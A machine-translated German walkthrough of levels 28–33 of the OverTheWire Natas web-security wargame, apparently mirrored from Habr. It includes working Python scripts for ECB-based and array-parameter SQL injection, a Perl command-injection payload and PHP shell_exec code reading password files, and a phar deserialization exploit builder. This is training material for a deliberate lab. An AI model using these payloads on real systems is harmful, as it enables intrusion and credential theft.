<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👲🏽 🙍🏾 ▫️ Natas Web. Passage der CTF-Plattform zur Ausnutzung von Web-Schwachstellen. Teil 5 👇🏻 🍐 🙇🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel werden wir uns am Beispiel des Natas- Kriegsspiels mit der Funktionsweise einiger WEB-Identitäten befassen. Jede Ebene hat Zugriff a...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Natas Web. Passage der CTF-Plattform zur Ausnutzung von Web-Schwachstellen. Teil 5</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/465363/"><img src="https://habrastorage.org/webt/_-/zf/_u/_-zf_uvvs6ypsybfrqslsnqwx8k.png" alt="Bild"><br><br>  In diesem Artikel werden wir uns am Beispiel des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Natas-</a> Kriegsspiels mit der Funktionsweise einiger WEB-Identitäten befassen.  Jede Ebene hat Zugriff auf das Passwort der nächsten Ebene.  Alle Passwörter werden auch in den Dateien / etc / natas_webpass / gespeichert.  Beispielsweise wird das Kennwort für natas5 in der Datei / etc / natas_webpass / natas5 gespeichert und ist für die Benutzer natas4 und natas5 schreibgeschützt. <br><br>  Vergangene Teile: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 1</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 2</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 3</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Teil 4</a> . <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Organisationsinformationen</b> <div class="spoiler_text">  Speziell für diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit entwickeln möchten, werde ich über die folgenden Kategorien schreiben und sprechen: <br><br><ul><li>  PWN; </li><li>  Kryptographie (Krypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Darüber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchführung von Pentests und Schreiben von Exploits teilen. <br><cut></cut><br>  Damit Sie sich über neue Artikel, Software und andere Informationen informieren können, habe ich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">in Telegram</a> einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kanal</a> und eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gruppe eingerichtet, um alle Probleme</a> im Bereich ICD <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zu diskutieren</a> .  Außerdem werde ich Ihre persönlichen Anfragen, Fragen, Vorschläge und Empfehlungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">persönlich</a> prüfen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">und alle beantworten</a> . <br><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments übernimmt keine Verantwortung für Schäden, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die durch das Studium dieses Dokuments erworben wurden. <br></div></div><br><h2>  Stufe 28 </h2><br>  Beim Senden einer Anfrage wird eine Weiterleitung zu einer anderen Seite mit einer seltsamen Anfrage und Base64-Codierung angezeigt, deren Decodierung nichts ergibt. <br><br><img src="https://habrastorage.org/webt/cf/zj/qx/cfzjqxoth5dlerlwy-jstxfyd3a.png" alt="Bild"><br><br>  Wir senden jede Anfrage zur Anfrage.  Wir erhalten eine Fehlermeldung, die deutlich macht, dass die Umleitung eine Verschlüsselung verwendet. Auf dieser Seite wird die Anforderung entschlüsselt, bevor sie in die Datenbank übertragen wird.  Das heißt, wir müssen unsere Injektion verschlüsseln und an den Server senden, aber wir kennen den Schlüssel nicht.  Aber wir haben einen Verschlüsseler - das ist der Server. <br><br><img src="https://habrastorage.org/webt/qr/pu/ox/qrpuox4rcgdtxne4znoewsryctm.png" alt="Bild"><br><br>  Lassen Sie uns zunächst die Verschlüsselung behandeln.  Wir werden zwei verschiedene Zeilen "qwerty" und "asdfgh" senden und analysieren, wie sie konvertiert werden. <br><br><img src="https://habrastorage.org/webt/7h/d4/yh/7hd4yh_jjeypqqz69jn2eimnrnc.png" alt="Bild"><br><br>  Als Antwort erhalten wir identische Linien, die an einer bestimmten Stelle eine bestimmte Reihenfolge haben.  Da Anfang und Ende von zwei PCs (Chiffretext) identisch sind, können wir folgende Schlussfolgerungen ziehen: <br><br><ul><li>  Die anfängliche Ergänzung zu OT wird verwendet (Klartext); </li><li>  es gibt eine letzte Ergänzung zu OT; </li><li>  Der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">EZB-</a> Modus wird verwendet, da bei verschiedenen OT die letzten Blöcke des CT gleich sind, dh die Blöcke unabhängig voneinander sind. </li></ul><cut></cut><br>  Die Idee ist folgende: Wir senden eine Abfrage zur Verschlüsselung an die Datenbank, diese wird jedoch konvertiert, und daher wird die Injektion beim Entschlüsseln nicht bestanden.  Es ist notwendig, sich mit den Add-Ons zu befassen, um die Blöcke, in denen unsere Nutzdaten verschlüsselt werden, genau zu berechnen.  Nach der Verschlüsselung nehmen wir unsere Blöcke aus der Anfrage und senden sie nur an den Server.  Auf dem Server werden sie entschlüsselt und ausgeführt, da sie keine Add-Ons enthalten. <br><br>  Die Idee wird in vier Bildern dargestellt: <br><br><ol><li>  Präsentation von 5 Blöcken. </li><li>  Ein Encoder mit Start- und Endzusätzen, die eine leere Zeichenfolge verschlüsseln. </li><li>  Verschlüsselung der Zeichenfolge "TEXTTEXTTEXTTEXT". </li><li>  Wir entfernen die Ergänzungen, indem wir die erforderliche Anzahl von Zeichen vor und nach unserer Zeile hinzufügen, um sie in einen separaten Block zu setzen.  Wir nehmen vom PC nur den zweiten Block. </li></ol><br><img src="https://habrastorage.org/webt/6x/az/z6/6xazz648f0cgitqajlo-m7eksi0.png" alt="Bild"><br><br>  Auf diese Weise haben wir nur unsere verschlüsselte Zeichenfolge auf einem unbekannten Schlüssel erhalten !!! <br><br>  Erforderliche Daten: <br><br><ol><li>  Verschlüsselungsmodus (bekannt - EZB) </li><li>  Blocklänge (bekannt - 16) </li><li>  <b>Anfängliche Add-On-Länge (unbekannt)</b> </li><li>  Die Länge unseres Textes (bekannt - „SELECT Passwort <br>  AS Witz von Benutzern ") </li></ol><br>  Es ist notwendig, die Länge der anfänglichen Füllung herauszufinden.  Da die ersten beiden Blöcke gleich sind, senden wir eine unterschiedliche Anzahl von Zeichen. Sobald sich der dritte Block nicht mehr ändert, finden wir die Anzahl der Zeichen, die zur Ergänzung erforderlich sind.  Dies sind 10 Zeichen.  Unten ist eine Implementierung des obigen Algorithmus. <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urlparse <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urlsplit <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urllib2 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> unquote <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ChiperQuery</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, query)</span></span></span><span class="hljs-function">:</span></span> resp = requests.post(url, auth=auth, data={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: query}) query_param = unquote(urlsplit(resp.url)[<span class="hljs-number"><span class="hljs-number">3</span></span>][<span class="hljs-number"><span class="hljs-number">6</span></span>:]) byte_decode_query = bytearray(base64.b64decode(query_param)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> byte_decode_query <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SendPayload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, payload)</span></span></span><span class="hljs-function">:</span></span> enc_payload = base64.b64encode(bytes(payload)) ret = requests.get(url + <span class="hljs-string"><span class="hljs-string">'/search.php'</span></span>, auth=auth, params={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: enc_payload}) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ret.text url = <span class="hljs-string"><span class="hljs-string">"http://natas28.natas.labs.overthewire.org/"</span></span> auth = requests.auth.HTTPBasicAuth(<span class="hljs-string"><span class="hljs-string">"natas28"</span></span>, <span class="hljs-string"><span class="hljs-string">"JWwR438wkgTsNKBbcJoowyysdM82YjeF"</span></span>) query = <span class="hljs-string"><span class="hljs-string">"SELECT password AS joke FROM users"</span></span> query += <span class="hljs-string"><span class="hljs-string">" "</span></span> * (<span class="hljs-number"><span class="hljs-number">16</span></span>-len(query)%<span class="hljs-number"><span class="hljs-number">16</span></span>) plaintext = <span class="hljs-string"><span class="hljs-string">'b'</span></span>*<span class="hljs-number"><span class="hljs-number">10</span></span> + query + chr(<span class="hljs-number"><span class="hljs-number">16</span></span>)*<span class="hljs-number"><span class="hljs-number">16</span></span> chip_query = ChiperQuery(url, auth, plaintext) st_pos = len(query) count = st_pos+<span class="hljs-number"><span class="hljs-number">16</span></span> result = SendPayload(url, auth, chip_query[st_pos:st_pos+count]) print(result)</code> </pre> <br><img src="https://habrastorage.org/webt/hr/7g/jr/hr7gjrd3jg6_nqv_luh8pg1l7fm.png" alt="Bild"><br><br>  Wir bekommen das Passwort. <br><br><h2>  Level 29 </h2><br>  Es ist schwer zu erraten, dass der Perl-Code die Befehlszeilenfunktion aufruft und die in der Datendatei (die Sie auswählen können) angegebenen Befehle an den Befehl übergeben.  Tatsache ist, dass wir die Pipeline von "exec |" schließen können  read_command_file "in" exec |  read_command |  our_smd_command. " <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a21/389/622/a21389622a7c7611aed78ae6678fd996.png" alt="Bild"><br><br>  Tatsache ist jedoch, dass unser Team auf der Konsole und nicht auf der Website angezeigt wird.  Fügen Sie dazu den folgenden Befehl hinzu, um Zeichen in Eingabe- / Ausgabestreams zu ersetzen: “|  tr `vor` nach`. <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="Bild"><br><br>  Da der Befehl abgeschlossen ist, lesen wir das Passwort aus der angegebenen Datei.  Aber uns wird gesagt, dass wir das nicht können ... <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="Bild"><br><br>  Wir verwenden die Befehlszeilenfilterung und fügen Anführungszeichen an allen Stellen ein, die gelöscht werden, wenn der Befehl ausgeführt wird. <br><br><img src="https://habrastorage.org/webt/1h/a-/2-/1ha-2-9b0klpqpjytwvshd_6n7u.png" alt="Bild"><br><br>  Wir nehmen das Passwort weg. <br><br><h2>  Level 30 </h2><br>  Schauen wir uns den Quellcode an.  Hier wird die quote () -Methode verwendet, bei der alle Sonderzeichen in einer Zeichenfolge maskiert werden.  Es entweicht jedoch genau in der Zeichenfolge, wodurch wir das Recht haben, die Injektion zu betreiben, wenn wir beispielsweise ein Array verwendet haben (in diesem Fall wird ein Nullelement akzeptiert). <br><br><img src="https://habrastorage.org/webt/6r/2u/zq/6r2uzq4fn67dpsswpqhqihjtuna.png" alt="Bild"><br><br>  Lassen Sie uns eine Last für die Anfrage erstellen <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'username'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'password'</span></span>;</code> </pre> <br>  Da wir wissen, dass der Benutzername natas31 ist, geben wir die richtige Bedingung in das Passwort ein: '' oder 1. Dann wird unsere Anfrage so <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'natas31'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>;</code> </pre> <br>  Und jetzt bleibt es, ein Array zu senden. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests url = <span class="hljs-string"><span class="hljs-string">"http://natas30.natas.labs.overthewire.org/index.pl"</span></span> s = requests.Session() s.auth = (<span class="hljs-string"><span class="hljs-string">'natas30'</span></span>, <span class="hljs-string"><span class="hljs-string">'wie9iexae0Daihohv8vuu3cei9wahf0e'</span></span>) args = { <span class="hljs-string"><span class="hljs-string">"username"</span></span>: <span class="hljs-string"><span class="hljs-string">"natas31"</span></span>, <span class="hljs-string"><span class="hljs-string">"password"</span></span>: [<span class="hljs-string"><span class="hljs-string">"'' or 1"</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>] } r = s.post(url, data=args) print(r.text)</code> </pre> <br><img src="https://habrastorage.org/webt/k6/wz/l8/k6wzl8ddxaiazmonwchc3yqa6q8.png" alt="Bild"><br><br>  Wir nehmen das Passwort weg. <br><br><h2>  Level 31 </h2><br>  Das Wesentliche des Dienstes wird sofort klar: Aus der CSV-Datei erhalten wir die Tabelle in HTML. <br><br><img src="https://habrastorage.org/webt/lu/gy/ob/lugyobitqxvszjjwdv8mgyzze6a.png" alt="Bild"><br><br>  Sehen wir uns den Quellcode an. <br><br><img src="https://habrastorage.org/webt/72/h7/jn/72h7jnap6hzndui_h8p_wye_3ku.png" alt="Bild"><br><br>  Was also am interessantesten ist: Es ist die while-Zeile (&lt;$ file&gt;), während file die Zeile aus dem Parameter ist.  Somit ist es möglich, den Code auszuführen. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="Bild"><br><br>  Senden Sie eine beliebige CSV-Datei und fangen Sie die Anforderung in Burp Suite ab. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="Bild"><br><br>  Fügen wir nun den Befehl als Parameter hinzu. <br><pre> <code class="bash hljs">?/bin/cat%20/etc/natas_webpass/natas32%20|</code> </pre> <br><br><img src="https://habrastorage.org/webt/se/b9/pz/seb9pziilk6q0nyxsnucujmsx1w.png" alt="Bild"><br><br>  Fügen Sie die folgenden Zeilen hinzu, um die Last aus dem Parameter aufzurufen: <br><br><pre> <code class="plaintext hljs">-----------------------------716973545450730846281908502 Content-Disposition: form-data; name="file"; Content-Type: text/csv ARGV</code> </pre> <br><img src="https://habrastorage.org/webt/-n/fl/ml/-nflmldwytfowae7hvsi8m02fl8.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/7k/dx/rd/7kdxrdmfwgzlbbkdyuxt3rstck4.png" alt="Bild"><br><br>  Wir bekommen das Passwort. <br><br><h2>  Level 32 </h2><br>  Wir öffnen die Seite, auf der uns mitgeteilt wird, dass wir die Ausführung des Codes beweisen und die Webroot-Datei ausführen müssen. <br><br><img src="https://habrastorage.org/webt/eg/it/df/egitdfbigqtdo792neb11yw39o8.png" alt="Bild"><br><br>  Wenn Sie sich den Code ansehen, ist er genau der gleiche wie auf der vorherigen Ebene.  Dann nutzen wir die Sicherheitslücke wie beim letzten Mal.  Lassen Sie uns die Webroot-Datei finden.  Schauen Sie sich dazu das Verzeichnis an und laden Sie Folgendes: ls -la | <br><br><img src="https://habrastorage.org/webt/a-/uy/el/a-uyelts3nbtxtzohnb0hte-t0o.png" alt="Bild"><br><br>  Holen Sie sich die Liste der Dateien.  Webroot ist nicht da, aber es gibt ein seltsames Programm getpassword. <br>  Wir führen es aus. <br><br><img src="https://habrastorage.org/webt/iv/iv/8f/iviv8f54cgrlx9j_glp770jng5g.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/jz/3j/ok/jz3jok9oavuzhsr3iqric_wodfi.png" alt="Bild"><br><br>  Wir bekommen das Passwort für das letzte Level. <br><br><img src="https://habrastorage.org/webt/dk/wm/vg/dkwmvgv2nnaaahnlnbbfcr97beo.png" alt="Bild"><br><br><h2>  Level 33 </h2><br>  Wieder das Datei-Upload-Formular. <br><br><img src="https://habrastorage.org/webt/mr/e4/hq/mre4hqlkvws3uidhslqgmgvu3va.png" alt="Bild"><br><br>  Schauen wir uns den Quellcode an. <br><br><img src="https://habrastorage.org/webt/-f/co/l9/-fcol9z_26on8wkfft6ndoktpny.png" alt="Bild"><br><br>  Daher müssen wir eine Datei mit einer Größe von bis zu 4 MB auf den Server hochladen. Wenn md5 des Inhalts der Datei dem Referenzwert entspricht, wird sie im PHP-Interpreter ausgeführt.  Wir schauen weiter.  Wir können den Dateinamen und seinen Inhalt steuern. <br><br><img src="https://habrastorage.org/webt/-e/lm/0g/-elm0gr1nbqnwi7wrm8sazsdcdy.png" alt="Bild"><br><br>  Ich werde gleich sagen, dass dies eine komplexe Sicherheitslücke ist, die ich vor einem halben Jahr getroffen habe.  Ziel ist es, dass wir eine Datei eines beliebigen Typs auf den Server hochladen können und alle Vorgänge mit ihrem Inhalt ausgeführt werden.  Über Phar-Dateien wird <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> geschrieben.  Kurz gesagt, ein spezielles PHP-Archiv, das serialisierte Daten darstellt.  In diesem Fall führt das Lesen des Phar-Streams zur Ausführung des Codes.  Auf diese Weise können Sie den Code serialisieren und an den Server senden.  Bei der Berechnung von md5 wird ein Stream gelesen, der zur Codeausführung führt. <br><br>  Erstellen Sie also zuerst eine PHP-Datei, die das Flag liest. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> shell_exec(<span class="hljs-string"><span class="hljs-string">'cat /etc/natas_webpass/natas34'</span></span>); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Laden Sie es auf den Server hoch.  Vergessen Sie nicht, den Namen in Burp Suite zu ändern. <br><br><img src="https://habrastorage.org/webt/d9/uk/v5/d9ukv57ubafrgtsvr5now1xevao.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/fp/3q/3c/fp3q3cisij3xvyjy6qnzgq0efjc.png" alt="Bild"><br><br>  Wir bekommen die Serverantwort ... Ok.  Erstellen Sie nun ein Phar-Archiv, das bei Ausführung die benötigten Werte ändert (der Hash ist immer korrekt und der Name der Datei, die bereits auf den Server hochgeladen wurde).  Also werden wir die Prüfung bestehen und der Server wird shell.php ausführen. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Shell</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $filename = <span class="hljs-string"><span class="hljs-string">"shell.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $signature = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $init = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } $phar = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Phar(<span class="hljs-string"><span class="hljs-string">"shell.phar"</span></span>); $phar-&gt;startBuffering(); $phar-&gt;addFromString(<span class="hljs-string"><span class="hljs-string">"123.txt"</span></span>, <span class="hljs-string"><span class="hljs-string">'123'</span></span>); $phar-&gt;setStub(<span class="hljs-string"><span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span></span>); $s = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Shell(); $phar-&gt;setMetadata($s); $phar-&gt;stopBuffering(); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Vor dem Kompilieren in der Datei /etc/php/xx/php.ini müssen Sie den Parameter phar.readonly in Off ändern. <br><br><img src="https://habrastorage.org/webt/5b/-f/wn/5b-fwntum8gegivytyszgod64j8.png" alt="Bild"><br><br>  Als nächstes führen Sie php shell.php aus und wir erhalten die .phar-Datei.  Wir senden es an den Server und ändern den Namen. <br><br><img src="https://habrastorage.org/webt/wr/mj/vh/wrmjvhey7hmfmlq9lpfgd8bylau.png" alt="Bild"><br><br>  Wir haben also beide Dateien: Archiv und Shell.  Jetzt müssen Sie veranlassen, dass die Datei aus dem Archiv gelesen wird, was zur Codeausführung führt. <br><br><img src="https://habrastorage.org/webt/yb/4w/id/yb4widil1bd9xhjzw0cdmgnjsns.png" alt="Bild"><br><br>  Wir bekommen das Passwort. <br><br><img src="https://habrastorage.org/webt/jc/9w/oy/jc9woyxlkl8wk6wakkwzxbqzmcg.png" alt="Bild"><br><br>  Das war der Veranstaltungsort von Natas.  Sie können sich uns <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">per Telegramm anschließen</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de465363/">https://habr.com/ru/post/de465363/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de465353/index.html">ICS-Sicherheitsaudit</a></li>
<li><a href="../de465355/index.html">Wenn 'a' nicht gleich 'a' ist. Nach einem Hack</a></li>
<li><a href="../de465357/index.html">Auswahl: 9 nützliche Materialien zur "professionellen" Auswanderung in die USA</a></li>
<li><a href="../de465359/index.html">Huawei CloudCampus: Hoch Cloud-Service-Infrastruktur</a></li>
<li><a href="../de465361/index.html">Digitale Kreuzung in Kasan: Wie Verkehrssicherheitstechnologien in der Stadt eingeführt werden</a></li>
<li><a href="../de465365/index.html">Windows 10-Setup-Skript</a></li>
<li><a href="../de465367/index.html">Wer hat sich nicht versteckt - ich bin nicht schuld (Geschichte der Geheimhaltung in der Luftfahrt)</a></li>
<li><a href="../de465369/index.html">Gewichtsunempfindliche neuronale Netze (WANN)</a></li>
<li><a href="../de465371/index.html">Berechnung der Nullhypothese, zum Beispiel die Analyse der Gehälter ukrainischer Programmierer</a></li>
<li><a href="../de465373/index.html">Kein Test des ASUS ZenBook Pro 15 UX580GE - fast ein Jahr mit fast der Spitze</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>